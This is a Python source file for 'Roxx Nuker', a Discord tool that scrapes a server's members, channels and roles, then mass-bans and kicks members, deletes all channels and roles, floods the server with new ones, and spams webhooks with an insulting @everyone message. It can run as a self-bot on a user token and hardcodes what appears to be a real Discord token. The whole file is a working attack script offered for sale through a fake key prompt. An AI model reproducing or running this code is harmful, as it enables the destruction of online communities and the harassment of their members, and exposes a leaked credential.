import requests

import os

import sys

import threading

import time

import json

import asyncio

import discord

import aiohttp

import datetime

import subprocess

from colorama import Fore

import psutil

from colored import fg, attr



from colorama import Fore, Style

from discord import Webhook, AsyncWebhookAdapter

from discord.ext import commands

from pypresence import Presence





date = datetime.datetime.now()

ok = date.strftime("%H:%M:%S")

def close():

    os._exit(0)



def writechar(text):

   for char in text:

     sys.stdout.write(char)

     sys.stdout.flush()

     time.sleep(0.1)







def clear(insta):

    if sys.platform.startswith("win"):

        os.system('cls')

    elif sys.platform == 'linux' or 'darwin':

        os.system('clear')



class colors:



    red = fg('#FF0000')

    reset = attr('reset')

    gray = fg('#ff4b00')

    green = fg('#006400')

    yellow = fg('#FFFF00')

    orange = fg('#ff4b00')





time.sleep(3)

os.system('cls')

print(f'''



{colors.red}









▄▄▄        ▐▄• ▄ ▐▄• ▄ 

▀▄ █·▪      █▌█▌▪ █▌█▌▪

▐▀▀▄  ▄█▀▄  ·██·  ·██· 

▐█•█▌▐█▌.▐▌▪▐█·█▌▪▐█·█▌

.▀  ▀ ▀█▄▀▪•▀▀ ▀▀•▀▀ ▀▀



   

 {colors.orange} [>] WELCOME TO ROXX NUKER

 {colors.orange} [>] MADE BY HACKER AND BEER

 {colors.orange} [>] JOIN ROXX ADDA FOR FURTHER UPDATES:- https://discord.gg/raop



''')

key = input(f"{colors.orange}[Roxx Nuker] {colors.red}USERNAME : {colors.red}")

key2 = input(f"{colors.orange}[Roxx Nuker] {colors.red}PASSWORD : {colors.red}")

token = ('ODg0OTk4ODk3MzE4MTIxNTAy.YTgpcw.P1xmBXYhQ6wsq0MZxY1A9pg1310')



while True:

    if key =="1":

        print("")

        print(f"")

        break

    else:

        print("Invalid Username! Restart the NUKER. To Purchase Key Dm Beer Or Hacker.")



while True:

    if key2 =="2":

        print("")

        print(f"")

        break

    else:

        print("Invalid Password! Restart the NUKER. To Purchase Key Dm Beer Or Hacker.")



os.system('cls')



def check_token():

    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:

        return "user"

    else:

        return "bot"



token_type = check_token()

intents = discord.Intents.all()

intents.members = True



if token_type == "user":

    headers = {'Authorization': f'{token}'}

    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)

elif token_type == "bot":

    headers = {'Authorization': f'Bot {token}'}

    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)



os.system('cls')



client.remove_command("help")



class rex:



    def __init__(self):

        self.colour = '\x1b[38;5;56m'



    def __init__(self):

        self.colour = '\x1b[38;5;56m'



    def BanMembers(self, guild, member):

        while True:

            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)

            if 'retry_after' in r.text:

                time.sleep(r.json()['retry_after'])

            else:

                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:

                    print(f"{colors.red}[Roxx Nuker] {colors.orange}Banned {colors.red}{member.strip()} {colors.red}")

                    break

                else:

                    break



    def KickMembers(self, guild, member):

        while True:

            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers)

            if 'retry_after' in r.text:

                time.sleep(r.json()['retry_after'])

            else:

                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:

                    print(f"{colors.red}[Roxx Nuker] {colors.orange}Banned {colors.red}{member.strip()}")

                    break

                else:

                    break



    def DeleteChannels(self, guild, channel):

        while True:

            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)

            if 'retry_after' in r.text:

                time.sleep(r.json()['retry_after'])

            else:

                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:

                    print(f"{colors.red}[Roxx Nuker] {colors.orange}Deleted Channel {colors.red}{channel.strip()}")

                    break

                else:

                    break

    

    def DeleteChannels(self, guild, channel):

        while True:

            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)

            if 'retry_after' in r.text:

                time.sleep(r.json()['retry_after'])

            else:

                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:

                    print(f"{colors.red}[Roxx Nuker] {colors.orange}Deleted Channel {colors.red}{channel.strip()}")

                    break

                else:

                    break



    def DeleteRoles(self, guild, role):

        while True:

            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers)

            if 'retry_after' in r.text:

                time.sleep(r.json()['retry_after'])

            else:

                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:

                    print(f"{colors.red}[Roxx Nuker] {colors.orange}Role Deleted {colors.red}{role.strip()}")

                    break

                else:

                    break



    def SpamChannels(self, guild, name):

        while True:

            json = {'name': name, 'type': 0}

            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=json)

            if 'retry_after' in r.text:

                time.sleep(r.json()['retry_after'])

            else:

                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:

                    print(f"{colors.red}[Roxx Nuker] {colors.orange}Created Channel {colors.red}{name}")

                    break

                else:

                    break



    def SpamRoles(self, guild, name):

        while True:

            json = {'name': name}

            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers, json=json)

            if 'retry_after' in r.text:

                time.sleep(r.json()['retry_after'])

            else:

                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:

                    print(f"{colors.red}[Roxx Nuker] {colors.orange}Created Role {colors.red} {name}")

                    break

                else:

                    break



    def WebhookSend(self, webhook, message): #credits to anti

        while True:

            json = {

                'content': message if message != '' else "@everyone ROXX OP BAKI SAB LUND KI TOPI https://discord.gg/raop",

                'tts': False,

                'username': 'ROXX PAPA'

            }

            r = requests.post(f'{webhook}', json=json)

            if r.status_code == 429:

                  time.sleep(r.json()['retry_after'])

                  self.WebhookSend(webhook, message)

                  break

            else:

                if r.status_code == 204 or 201 or 200:

                    print(f"{colors.red}[Roxx Nuker] {colors.orange}Sent message {colors.red} {message}")

                    break

                else:

                    break



    

    async def SpamWebhook(self, guild_id, amount, message):

        guild = client.get_guild(int(guild_id))

        web_urls = []

        for channel in guild.text_channels:

            try:

                webhook = await channel.create_webhook(name='Roxx Nuker', reason="https://discord.gg/HEr96xXpqn")

                print(f"{colors.red}[Roxx Nuker] {colors.orange}Spammed")

                web_urls.append(webhook.url)

            except Exception as e:

                print(e)

        for url in web_urls:

              for i in range(amount):

               try:

                  threading.Thread(target=self.WebhookSend, args=(url, message,)).start()

               except Exception as e:

                 print(e)











    async def Scrape(self):

        guild = input(f'{colors.red}[Roxx Nuker] {colors.orange}Server Id: {colors.red}')

        await client.wait_until_ready()

        guildOBJ = client.get_guild(int(guild))

        members = await guildOBJ.chunk()



        try:

            os.remove("scraped/members.txt")

            os.remove("scraped/channels.txt")

            os.remove("scraped/roles.txt")

        except:

            pass



        membercount = 0

        with open('scraped/members.txt', 'a') as m:

            for member in members:

                m.write(str(member.id) + "\n")

                membercount += 1

            print(f"\n{colors.red}[Roxx Nuker] {colors.orange}Server has {colors.red}{membercount} Members")

            m.close()



        channelcount = 0

        with open('scraped/channels.txt', 'a') as c:

            for channel in guildOBJ.channels:

                c.write(str(channel.id) + "\n")

                channelcount += 1

            print(f"{colors.red}[Roxx Nuker] {colors.orange}Scrapped {colors.red}{channelcount} Channels")

            c.close()



        rolecount = 0

        with open('scraped/roles.txt', 'a') as r:

            for role in guildOBJ.roles:

                r.write(str(role.id) + "\n")

                rolecount += 1

            print(f"{colors.red}[Roxx Nuker] {colors.orange}Scrapped {colors.red}{rolecount} Roles")

            r.close()



    async def NukeExecute(self):

        guild = input(f'{colors.red}[Roxx Nuker] {colors.orange}Server Id: {colors.red}')

        channel_name = input(f"{colors.red}[Roxx Nuker] {colors.orange}Channels Name: {colors.red}")

        channel_amount = input(f"{colors.red}[Roxx Nuker] {colors.orange}How Many?: {colors.red}")

        role_name = input(f"{colors.red}[Roxx Nuker] {colors.orange}Roles Name: {colors.red}")

        role_amount = input(f"{colors.red}[Roxx Nuker] {colors.orange}How Many?: {colors.red}")

        print()



        members = open('scraped/members.txt')

        channels = open('scraped/channels.txt')

        roles = open('scraped/roles.txt')



        for member in members:

            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()

        for channel in channels:

            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()

        for role in roles:

            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()

        for i in range(int(channel_amount)):

            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()

        for i in range(int(role_amount)):

            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()

        members.close()

        channels.close()

        roles.close()



    async def BanExecute(self):

        guild = input(f'{colors.red}[Roxx Nuker] {colors.orange}Server Id: {colors.red}')

        print()

        members = open('scraped/members.txt')

        for member in members:

            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()

        members.close()



    async def KickExecute(self):

        guild = input(f'{colors.red}[Roxx Nuker] {colors.orange}Server Id: {colors.red}')

        print()

        members = open('scraped/members.txt')

        for member in members:

            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()

        members.close()



    async def ChannelDeleteExecute(self):

        guild = input(f'{colors.red}[Roxx Nuker] {colors.orange}Server Id: {colors.red}')

        print()

        channels = open('scraped/channels.txt')

        for channel in channels:

            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()

        channels.close()



    async def RoleDeleteExecute(self):

        guild = input(f'{colors.red}[Roxx Nuker] {colors.orange}Server Id: {colors.red}')

        print()

        roles = open('scraped/roles.txt')

        for role in roles:

            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()

        roles.close()



    async def ChannelSpamExecute(self):

        guild = input(f'{colors.red}[Roxx Nuker] {colors.orange}Server Id: {colors.red}')

        name = input(f"{colors.red}[Roxx Nuker] {colors.orange}Role Name:: {colors.red}")

        amount = input(f"{colors.red}[Roxx Nuker] {colors.orange}How Many?: {colors.red}")

        print()

        for i in range(int(amount)):

            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()



    async def RoleSpamExecute(self):

        guild = input(f'{colors.red}[Roxx Nuker] {colors.orange}Server Id: {colors.red}')

        name = input(f"{colors.red}[Roxx Nuker] {colors.orange}Role Name: {colors.red}")

        amount = input(f"{colors.red}[Roxx Nuker] {colors.orange}How Many?: {colors.red}")

        print()

        for i in range(int(amount)):

            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()



    def Credits(self):

        os.system(f'')

        print(f'''

''')





    async def Menu(self):

        os.system(f'cls & title LOGIN AS  {client.user}')

        print(f'''



                                          {colors.orange}



                                          



██    ██     ██████  

██    ██          ██ 

██    ██      █████  

 ██  ██      ██      

  ████       ███████ 

                     

                   Made By Beer &ITACHI

                                                            

                                      {colors.red}



                                                   

                                              {colors.orange}>1 {colors.red}Scrape            {colors.orange}>5 {colors.red}Delete Roles

                                                      

                                              {colors.orange}>2 {colors.red}Banall            {colors.orange}>6 {colors.red}Delete Channels



                                              {colors.orange}>3 {colors.red}Webhook Spam      {colors.orange}>7 {colors.red}Nuke Server



                                              {colors.orange}>4 {colors.red}Kick All          {colors.orange}>8 {colors.red}Spam Roles



                                                      {colors.orange}>9 {colors.red}Spam Channels



            ''')

        choice = input(f'{colors.red}[Roxx Nuker] {colors.orange}Number: {colors.red}')

        if choice == '2': #bans

            await self.BanExecute()

            time.sleep(2)

            await self.Menu()

        elif choice == '4': #Kicks

            await self.KickExecute()

            time.sleep(2)

            await self.Menu()

        elif choice == '5': #Role Delete

            await self.RoleDeleteExecute()

            time.sleep(2)

            await self.Menu()

        elif choice == '6': #Delete Channel

            await self.ChannelDeleteExecute()

            time.sleep(2)

            await self.Menu()

        elif choice == '8': #Role Create

            await self.RoleSpamExecute()

            time.sleep(2)

            await self.Menu()

        elif choice == '9': #Channel Create

            await self.ChannelSpamExecute()

            time.sleep(2)

            await self.Menu()

        elif choice == '7': #beamserver

            await self.NukeExecute()

            time.sleep(2)

            await self.Menu()

        elif choice == '1': #Role Create

            await self.Scrape()

            time.sleep(3)

            await self.Menu()

        elif choice == '213': #Role Create

            await self.ThemeChanger()

        elif choice == '123' or choice == 'c':

            self.Credits()

            input()

            await self.Menu()

        elif choice == '3':

            amount = int(input(f"{colors.red}[Roxx Nuker] {colors.orange}How Many?: {colors.red}"))

            guild_id = int(input(f"{colors.red}[Roxx Nuker] {colors.orange}Server Id: {colors.red}"))

            message = str(input(f"{colors.red}[Roxx Nuker] {colors.orange}Webhook Message: {colors.red}"))

            await self.SpamWebhook(guild_id, amount, message)

        elif choice == '432' or choice == 'x':

            os._exit(0)



    @client.event

    async def on_ready():

        await rex().Menu()



    def Startup(self):

        try:

            if token_type == "user":

                client.run(token, bot=False)

            elif token_type == "bot":

                client.run(token)

        except:

            print(f'{Fore.YELLOW}[Roxx Nuker] {colors.orange}Token Was Invalid {colors.red}')

            input()

            os._exit(0)



if __name__ == "__main__":

    rex().Startup()



